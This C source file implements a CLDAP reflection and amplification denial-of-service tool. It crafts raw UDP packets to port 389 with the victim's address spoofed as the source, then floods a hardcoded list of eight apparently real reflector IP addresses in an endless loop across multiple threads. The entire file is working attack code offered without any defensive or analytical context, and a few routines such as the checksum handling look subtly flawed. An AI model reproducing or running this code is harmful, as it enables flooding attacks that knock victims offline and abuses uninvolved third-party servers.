#include "cldap_amplification.h"

void send_packet(CLDAP *cldap) {
    List *head = NULL;
    head = (List *)malloc(sizeof(List));
    bzero(&head->data, sizeof(head->data));
    head->data.sin_addr.s_addr=inet_addr("51.141.50.209");
    head->next = head;
    head->prev = head;

    List *new_node = (List *)malloc(sizeof(List));
    memset(new_node, 0x00, sizeof(List));
    new_node->data.sin_addr.s_addr=inet_addr("92.62.137.217");
    new_node->prev = head;
    new_node->next = head->next;
    head->next = new_node;

    new_node = (List *)malloc(sizeof(List));
    memset(new_node, 0x00, sizeof(List));
    new_node->data.sin_addr.s_addr=inet_addr("5.254.82.120");
    new_node->prev = head;
    new_node->next = head->next;
    head->next = new_node;

    new_node = (List *)malloc(sizeof(List));
    memset(new_node, 0x00, sizeof(List));
    new_node->data.sin_addr.s_addr=inet_addr("42.117.3.239");
    new_node->prev = head;
    new_node->next = head->next;
    head->next = new_node;

    new_node = (List *)malloc(sizeof(List));
    memset(new_node, 0x00, sizeof(List));
    new_node->data.sin_addr.s_addr=inet_addr("187.189.241.84");
    new_node->prev = head;
    new_node->next = head->next;
    head->next = new_node;

    new_node = (List *)malloc(sizeof(List));
    memset(new_node, 0x00, sizeof(List));
    new_node->data.sin_addr.s_addr=inet_addr("187.135.84.188");
    new_node->prev = head;
    new_node->next = head->next;
    head->next = new_node;

    new_node = (List *)malloc(sizeof(List));
    memset(new_node, 0x00, sizeof(List));
    new_node->data.sin_addr.s_addr=inet_addr("51.136.14.21");
    new_node->prev = head;
    new_node->next = head->next;
    head->next = new_node;

    new_node = (List *)malloc(sizeof(List));
    memset(new_node, 0x00, sizeof(List));
    new_node->data.sin_addr.s_addr=inet_addr("13.69.81.252");
    new_node->prev = head;
    new_node->next = head->next;
    head->next = new_node;

    List* current = head->next;
    List* list_node = current;

    while(1) {
        cldap->ip->ip_dst.s_addr = list_node->data.sin_addr.s_addr;
        cldap->ip->ip_sum = check_sum((unsigned short*)cldap->ip, sizeof(struct ip));
        cldap->ip->ip_id = htonl(rand());

        sendto(
            cldap->sockfd, 
            cldap->packet, 
            cldap->PACKET_SIZE,
            0, 
            (struct sockaddr*)&list_node->data, 
            sizeof(list_node->data)
        );
        list_node = list_node->next;
    }
}

unsigned short check_sum(unsigned short *addr, int len) {
    u_int32_t checkSum  = 0;

    while (len > 0) {
        checkSum += *addr++;
        len -= 2;
    }

    if (len == 0) {
        checkSum += *(unsigned char*)addr;
    }

    checkSum = (checkSum >> 16) + (checkSum & 0xffff);
    checkSum = checkSum + (checkSum >> 16);

    return ~checkSum;
}

CLDAP* set_address(CLDAP *cldap, unsigned long *attacked_addr) {
    cldap->attacked_addr = *attacked_addr;
    cldap->cldap_server_addr = 0;

    return cldap;
}

CLDAP* create_socket(CLDAP *cldap) {
    int tmp = 1;
    const int *val = &tmp;
    cldap->sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    setsockopt(cldap->sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp));

    return cldap;
}

CLDAP* construct_IP(CLDAP *cldap) {
    cldap->ip = (struct ip *)cldap->packet;
    cldap->ip->ip_v = 4;
    cldap->ip->ip_hl = 5;
    cldap->ip->ip_tos = 0;
    cldap->ip->ip_id = htonl(rand());
    cldap->ip->ip_src.s_addr = cldap->attacked_addr;
    cldap->ip->ip_dst.s_addr = cldap->cldap_server_addr;
    cldap->ip->ip_ttl = 255;
    cldap->ip->ip_off = 0;
    cldap->ip->ip_p = IPPROTO_UDP;
    cldap->ip->ip_len = htons(cldap->PACKET_SIZE);
    cldap->ip->ip_sum = check_sum((unsigned short*)cldap->ip, sizeof(struct ip));

    return cldap;
}

CLDAP* construct_UDP(CLDAP *cldap) {
    cldap->udp = (struct udphdr*) (cldap->packet + sizeof(struct ip));
    cldap->udp->uh_sport = htons(rand());
    cldap->udp->uh_dport = htons(389);
    cldap->udp->uh_ulen = htons(cldap->IP_DATA_SIZE);
    cldap->udp->uh_sum = 0;

    return cldap;
}

CLDAP* construct_packet(CLDAP *cldap) {
    cldap->packet = (char*)malloc(cldap->PACKET_SIZE);
    cldap->packet = memset(cldap->packet, 0, cldap->PACKET_SIZE);

    cldap = construct_IP(cldap);
    cldap = construct_UDP(cldap);

    memcpy(cldap->packet, cldap->ip, cldap->IP_HDR_SIZE);
    memcpy(cldap->packet + cldap->IP_HDR_SIZE, cldap->udp, cldap->UDP_HDR_SIZE);
    memcpy(cldap->packet + cldap->IP_HDR_SIZE + cldap->UDP_HDR_SIZE, UDP_DATA, cldap->UDP_DATA_SIZE);

    return cldap;
}

CLDAP* set_socket(CLDAP *cldap) {
    cldap->sin.sin_family = AF_INET;
    cldap->sin.sin_port = cldap->udp->uh_dport;
    cldap->sin.sin_addr.s_addr = cldap->ip->ip_dst.s_addr;

    return cldap;
}

int cldap_build(void *arg_ipinfo) {
    CLDAP *cldap = malloc(sizeof(CLDAP));
    IPinfo *ipinfo = (IPinfo *)arg_ipinfo;
    cldap = memset(cldap, 0, sizeof(CLDAP));

    *(int *)&cldap->UDP_DATA_SIZE = 57;
    *(int *)&cldap->UDP_HDR_SIZE = 8;
    *(int *)&cldap->IP_DATA_SIZE = cldap->UDP_DATA_SIZE + cldap->UDP_HDR_SIZE;
    *(int *)&cldap->IP_HDR_SIZE = 20;
    *(int *)&cldap->PACKET_SIZE = cldap->IP_DATA_SIZE + cldap->IP_HDR_SIZE;

    cldap = set_address(cldap, &ipinfo->attacked_addr);
    cldap = create_socket(cldap);
    cldap = construct_packet(cldap);
    cldap = set_socket(cldap);
    send_packet(cldap);

    close(cldap->sockfd);
    free(cldap->packet);
    free(cldap);

    return 0;
}

int cldap_amplification(IPinfo ipinfo, int MAX_THREADS) {
    pthread_t thread_id[MAX_THREADS];

    for(int i = 0; i < MAX_THREADS; i++) {
        ipinfo.thread_id = i;
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_create(&thread_id[i], &attr, (void *)cldap_build, (void *)&ipinfo);
        sleep(1);
    }

    for(int i = 0; i < MAX_THREADS; i++) { 
        pthread_join(thread_id[i], NULL);
    }

    return 0;
}
